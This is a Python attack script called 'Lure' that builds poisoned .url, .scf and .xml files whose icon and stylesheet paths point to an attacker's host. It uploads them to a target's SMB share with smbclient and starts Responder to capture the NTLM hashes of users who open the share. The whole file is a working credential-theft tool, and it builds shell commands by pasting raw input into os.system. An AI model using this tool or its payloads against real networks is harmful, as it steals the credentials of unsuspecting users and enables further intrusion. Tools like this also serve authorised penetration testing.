#!/usr/bin/env python3
"""Lure — SMB Hash Bait.

Drops poisoned .url/.scf/.xml payloads onto writable SMB shares to coerce
NTLM authentication, then hands off to Responder for capture.
"""

import argparse
import os
import sys
import time

import colorama

# Catppuccin Mocha — water palette
TEAL     = "\033[38;2;148;226;213m"
SKY      = "\033[38;2;137;220;235m"
SAPPHIRE = "\033[38;2;116;199;236m"
BLUE     = "\033[38;2;137;180;250m"
LAVENDER = "\033[38;2;180;190;254m"
# Status colors (Catppuccin Mocha)
GREEN    = "\033[38;2;166;227;161m"
YELLOW   = "\033[38;2;249;226;175m"
RED      = "\033[38;2;243;139;168m"
MAGENTA  = "\033[38;2;203;166;247m"
RESET    = "\033[0m"


def _banner():
    print(TEAL     + "   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print(SKY      + "    _     _   _ ____  _____ ")
    print(SAPPHIRE + "   | |   | | | |  _ \\| ____|")
    print(BLUE     + "   | |   | | | | |_) |  _|  ")
    print(LAVENDER + "   | |___| |_| |  _ <| |___ ")
    print(SAPPHIRE + "   |_____|\\___/|_| \\_\\_____|")
    print(SKY      + "        ~ SMB Hash Bait ~     " + RESET)


def main():
    colorama.just_fix_windows_console()
    _banner()

    parser = argparse.ArgumentParser(
        prog="lure",
        description="Lure — SMB Hash Bait",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-r", "--RHOST", action="store", metavar="IP", help="Target SMB server (RHOST)")
    parser.add_argument("-l", "--LHOST", action="store", metavar="IP", help="Attacker IP embedded in payload UNC paths (LHOST)")
    parser.add_argument("-d", "--DOMAIN", action="store", metavar="NAME", help="Domain for authenticated upload")
    parser.add_argument("-i", "--Interface", action="store", metavar="IFACE", help="Network interface for Responder")
    parser.add_argument("-a", "--Share", action="store", metavar="NAME", help="Target share name")
    parser.add_argument("-o", "--Other", action="store", metavar="PATH", help="Subdirectory inside the share (when root is read-only)")
    parser.add_argument("-U", "--Username", action="store", metavar="USER", help="Username for authenticated upload")
    parser.add_argument("-P", "--Password", action="store", metavar="PASS", help="Password for authenticated upload")
    parser.add_argument("-u", "--url", action="store_true", help="Drop @lure.url payload")
    parser.add_argument("-s", "--scf", action="store_true", help="Drop @lure.scf payload")
    parser.add_argument("-x", "--xml", action="store_true", help="Drop @lure.xml payload")
    parser.add_argument("-A", "--All", action="store_true", help="Drop all three payloads (@lure.url, @lure.scf, @lure.xml)")

    if not sys.argv[1:]:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()

    RHOST = args.RHOST
    LHOST = args.LHOST
    DOMAIN = args.DOMAIN
    INTERFACE = args.Interface
    SHARE = args.Share
    USERNAME = args.Username
    PASSWORD = args.Password
    OTHER = args.Other

    if not (args.scf or args.url or args.xml or args.All):
        print(YELLOW + "What do you want from me!!!" + RESET)
        parser.print_help()
        sys.exit()

    if USERNAME is not None and PASSWORD is None:
        print(RED + "Need password if utilizing a username" + RESET)

    def url():
        print(YELLOW + "Making @lure.url \n" + RESET)
        f = open("@lure.url", "w")
        template = f"""[InternetShortcut]\n
URL=whatever\n
WorkingDirectory=whatever\n
IconFile=\\\\""" + LHOST + """\\%USERNAME%.icon\n
IconIndex=1"""
        f.write(template)
        time.sleep(1)
        print(GREEN + "Putting file into smb server, responder will automatically start \n" + RESET)

    def scf():
        print(YELLOW + "Making @lure.scf \n" + RESET)
        f = open("@lure.scf", "w")
        template = f"""[Shell]\n
Command=2\n
IconFile=\\\\""" + LHOST + """\\tools\\nc.ico\n
[Taskbar]\n
Command=ToggleDesktop"""
        f.write(template)
        print(GREEN + "Putting file into smb server and starting Responder \n " + RESET)

    def xml():
        print(YELLOW + "Making @lure.xml \n" + RESET)
        f = open("@lure.xml", "w")
        template = f"""("<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
"<?mso-application progid='Word.Document'?>\n"
"<?xml-stylesheet type='text/xsl' href='\\\\""" + LHOST + """\\lure.xsl' ?>")"""
        f.write(template)
        print(GREEN + "Putting file into smb server, once done exit out of SMB Server and responder will automatically start \n" + RESET)

    def URL_File():
        if USERNAME is not None and PASSWORD is not None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -U """ + DOMAIN + """/""" + USERNAME + """%""" + PASSWORD + """ -c 'put @lure.url'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
        if OTHER is not None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c '; cd '""" + OTHER + """' ; put @lure.url'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
        if OTHER is None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c 'put @lure.url'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")

    def SCF_File():
        if USERNAME is not None and PASSWORD is not None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -U """ + DOMAIN + """/""" + USERNAME + """%""" + PASSWORD + """ -c 'put @lure.scf'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
        if OTHER is not None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c '; cd '""" + OTHER + """' ; put @lure.scf'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
        if OTHER is None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c 'put @lure.scf'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")

    def XML_File():
        if USERNAME is not None and PASSWORD is not None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -U """ + DOMAIN + """/""" + USERNAME + """%""" + PASSWORD + """ -c 'put @lure.xml'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
        if OTHER is not None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c '; cd '""" + OTHER + """' ; put @lure.xml'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
        if OTHER is None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c 'put @lure.xml'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")

    def ALL():
        if USERNAME is not None and PASSWORD is not None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -U """ + DOMAIN + """/""" + USERNAME + """%""" + PASSWORD + """ -c 'put @lure.xml; put @lure.scf; put @lure.url'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
        if OTHER is not None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c '; cd '""" + OTHER + """' ; put @lure.xml; put @lure.url; put @lure.scf'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")
        if OTHER is None:
            os.system("""smbclient //""" + RHOST + """/""" + SHARE + """ -c 'put @lure.xml; put @lure.url; put @lure.scf'""")
            os.system("""sudo responder -I """ + INTERFACE + """ -wv""")

    if args.url:
        url()
        URL_File()
    if args.scf:
        scf()
        SCF_File()
    if args.xml:
        xml()
        XML_File()
    if args.All:
        xml()
        url()
        scf()
        ALL()


if __name__ == "__main__":
    main()
